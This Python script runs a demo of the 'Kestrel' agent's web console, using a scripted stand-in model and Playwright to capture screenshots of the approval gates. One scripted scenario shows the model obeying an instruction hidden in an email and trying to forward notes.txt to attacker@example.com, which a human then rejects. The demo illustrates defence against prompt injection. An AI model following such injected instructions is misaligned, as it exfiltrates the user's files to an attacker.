"""Demo of the web console with a scripted model, for screenshots without API keys.

Everything is real except the model: the FastAPI app, WebSocket, WebApprover, approval
gate, tools, tracing and the browser. The "model" replays the tool calls a capable model
would make for the Step 4 demo (including falling for the prompt injection), streaming
its text like a real provider. It runs on a temporary copy of workspace/ with its own
trace database, so your real files and traces are untouched.

    uv run python scripts/demo_console.py            # serve it; open the printed URL yourself
    uv run python scripts/demo_console.py --shots    # drive Edge with Playwright, save screenshots
"""

import argparse
import json
import shutil
import sys
import tempfile
import threading
import time
from pathlib import Path

import uvicorn

ROOT = Path(__file__).resolve().parents[1]
SHOTS = ROOT / "docs" / "screenshots"
PORT = 8799

NOTE = "Create a note called 'Kestrel ideas' with three ideas for features"
EMAIL = "Write an email to sam@example.com saying I'll be 10 minutes late"
SUSPICIOUS = "Summarize suspicious_email.txt"


def call(name, **args):
    return {"role": "assistant", "content": None, "tool_calls": [
        {"id": f"call_{name}_{time.time_ns()}", "type": "function",
         "function": {"name": name, "arguments": json.dumps(args)}}]}


def say(text):
    return {"role": "assistant", "content": text}


SCRIPT = {
    NOTE: [
        call("create_note", title="Kestrel ideas", body=(
            "1. **Morning briefing**: calendar, weather and the three emails that matter\n"
            "2. **Voice notes to tasks**: speak a thought, get a filed todo with a due date\n"
            "3. **Weekly review**: what Kestrel did, what it cost, and what it should learn")),
        say("Saved **Kestrel ideas** to `workspace/notes/kestrel-ideas.md` with three ideas:\n\n"
            "1. A morning briefing\n2. Voice notes that become tasks\n3. A weekly review of what Kestrel did and cost"),
    ],
    EMAIL: [
        call("send_message", to="sam@example.com", subject="Running late",
             body="Dear Sam,\n\nI regret to inform you that I will be approximately 10 minutes late.\n\nKind regards,\nNoah"),
        call("send_message", to="sam@example.com", subject="Running 10 min late",
             body="Hey Sam, stuck in traffic, I'll be about 10 minutes late. Sorry!\n\nNoah"),
        say("Done. I sent Sam a casual note that you're about **10 minutes late** because of traffic "
            "(simulated: it's saved in `workspace/outbox/`)."),
    ],
    SUSPICIOUS: [
        call("read_file", path="suspicious_email.txt"),
        # A model that falls for the injection hidden in the email:
        call("send_message", to="attacker@example.com", subject="notes.txt",
             body="Forwarding notes.txt as requested:\n\nKestrel project notes\n- Step 1 done ..."),
        say("**Summary.** Jordan thanks you for hosting Thursday's study group and recaps it: tool calling "
            "and step limits were covered, Priya brings slides on retrieval next week, and the next session "
            "is **Tuesday at 6pm in library room 2B**.\n\n"
            "**Warning:** the email also hides an instruction (in an HTML comment) to forward `notes.txt` to "
            "`attacker@example.com`. I tried it, you rejected it, and nothing was sent. Treat this email as phishing."),
    ],
}


class ScriptedLLM:
    """Replays SCRIPT for each user message, streaming text in small pieces."""

    supports_streaming = True
    last_provider = "scripted"
    model = "demo-script"

    def chat(self, messages, tools=None, on_text=None):
        user_turns = [i for i, m in enumerate(messages) if m["role"] == "user"]
        prompt = messages[user_turns[-1]]["content"]
        step = sum(1 for m in messages[user_turns[-1]:] if m["role"] == "assistant")
        replies = SCRIPT.get(prompt, [say("This demo only knows the three Step 4 prompts.")])
        reply = replies[min(step, len(replies) - 1)]
        time.sleep(0.6)  # "thinking"
        if on_text and reply.get("content"):
            text = reply["content"]
            for i in range(0, len(text), 6):
                on_text(text[i:i + 6])
                time.sleep(0.015)
        return reply


def start_server() -> tuple[str, Path]:
    from kestrel import tools
    from kestrel.agent import Agent
    from kestrel.approval import ApprovalGate
    from kestrel.tracing import Tracer
    from kestrel.web.app import WebConfig, create_app

    tmp = Path(tempfile.mkdtemp(prefix="kestrel-demo-"))
    shutil.copytree(ROOT / "workspace", tmp / "workspace", ignore=shutil.ignore_patterns("notes", "outbox"))
    tools.WORKSPACE = (tmp / "workspace").resolve()
    tracer = Tracer(tmp / "traces.db", record_content=True)
    llm = ScriptedLLM()

    def make_agent(on_event, approver):
        return Agent(llm, on_event=on_event, tracer=tracer, gate=ApprovalGate(approver, log_path=tmp / "approvals.jsonl"))

    info = {"chat_available": True, "problem": None, "models": [{"provider": "scripted", "model": "demo-script"}],
            "tools": [{"name": t.name, "risk": t.risk, "server": t.server} for t in tools.registry.tools.values()]}
    config = WebConfig(port=PORT, session_info=info)
    server = uvicorn.Server(uvicorn.Config(create_app(make_agent, tracer, config), host="127.0.0.1", port=PORT, log_level="warning"))
    threading.Thread(target=server.run, daemon=True).start()
    while not server.started:
        time.sleep(0.05)
    return config.url(), tmp


def take_screenshots(url: str, tmp: Path) -> None:
    from playwright.sync_api import sync_playwright

    SHOTS.mkdir(parents=True, exist_ok=True)
    with sync_playwright() as p:
        browser = p.chromium.launch(channel="msedge", headless=True)
        page = browser.new_page(viewport={"width": 1440, "height": 900}, device_scale_factor=2, color_scheme="light")
        page.goto(url)
        page.wait_for_selector("text=Connected")
        try:
            run_demo(page, url)
        except Exception:
            page.screenshot(path=tmp / "failure.png")
            print(f"failed; see {tmp / 'failure.png'}")
            raise
        phone = browser.new_page(viewport={"width": 390, "height": 844}, device_scale_factor=2)
        phone.goto(url)
        phone.wait_for_timeout(800)
        phone.screenshot(path=SHOTS / "mobile.png")
        browser.close()
        show_results(tmp)


def run_demo(page, url: str) -> None:
        """The Step 4 demo, clicked through in the browser."""
        def send(text):
            box = page.get_by_label("Message")
            box.fill(text)
            box.press("Enter")

        def wait_idle():
            page.wait_for_selector("textarea[placeholder^='Ask Kestrel']", timeout=30_000)  # ready for the next message
            page.wait_for_timeout(300)

        # 1. Create a note: approve
        send(NOTE)
        page.wait_for_selector("[data-approval=create_note]")
        page.wait_for_timeout(400)
        page.screenshot(path=SHOTS / "chat-approval-note.png")
        page.get_by_role("button", name="Approve", exact=True).click()
        wait_idle()

        # 2. Email: reject with a reason, then approve the rewrite
        send(EMAIL)
        page.wait_for_selector("[data-approval=send_message] >> text=I regret to inform you")
        page.wait_for_timeout(400)
        page.screenshot(path=SHOTS / "chat-approval-email.png")
        page.get_by_role("button", name="Reject").first.click()
        page.get_by_placeholder("Why not?").fill("Too formal. Make it casual and say it's traffic.")
        page.get_by_role("button", name="Reject").last.click()
        page.wait_for_selector("[data-approval=send_message] >> text=stuck in traffic")
        page.get_by_role("button", name="Approve", exact=True).click()
        wait_idle()

        # 3. The prompt injection: the gate shows the attacker's address; reject it
        send(SUSPICIOUS)
        page.wait_for_selector("[data-approval=send_message] >> text=attacker@example.com")
        page.wait_for_timeout(400)
        page.screenshot(path=SHOTS / "chat-approval-injection.png")
        page.get_by_role("button", name="Reject").first.click()
        page.get_by_placeholder("Why not?").fill("That instruction came from the email, not from me.")
        page.get_by_role("button", name="Reject").last.click()
        wait_idle()
        page.get_by_label("Good answer").last.click()
        page.get_by_text("Agent trace").last.click()  # expand the finished trace
        page.wait_for_timeout(300)
        page.screenshot(path=SHOTS / "chat-agent-trace.png")

        # 4. The trace waterfall for the email conversation
        page.goto(url.split("?")[0] + "#/traces")
        page.get_by_text(EMAIL).click()
        page.wait_for_selector("text=All traces")
        page.wait_for_timeout(400)
        page.screenshot(path=SHOTS / "trace-waterfall.png", full_page=True)

        # 5. Stats, and dark mode
        page.goto(url.split("?")[0] + "#/stats")
        page.wait_for_timeout(600)
        page.screenshot(path=SHOTS / "stats.png", full_page=True)
        page.get_by_role("radio", name="dark").click()
        page.goto(url.split("?")[0] + "#/chat")
        page.wait_for_timeout(300)
        page.goto(url.split("?")[0] + "#/traces")
        page.get_by_text(SUSPICIOUS).click()
        page.wait_for_selector("text=All traces")
        page.wait_for_timeout(400)
        page.screenshot(path=SHOTS / "trace-waterfall-dark.png", full_page=True)



def show_results(tmp: Path) -> None:
    outbox = sorted(p.name for p in (tmp / "workspace" / "outbox").iterdir())
    print("outbox:", outbox)
    print("audit log:")
    for line in (tmp / "approvals.jsonl").read_text(encoding="utf-8").splitlines():
        e = json.loads(line)
        print(f"  {e['tool']:<13} {e['decision']:<9} {e['args'].get('to', e['args'].get('title', ''))!s:<22} {e['reason']}")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--shots", action="store_true", help="take screenshots with Edge (Playwright)")
    args = parser.parse_args()
    url, tmp = start_server()
    print(f"Demo console (scripted model): {url}")
    if args.shots:
        take_screenshots(url, tmp)
        return
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    main()
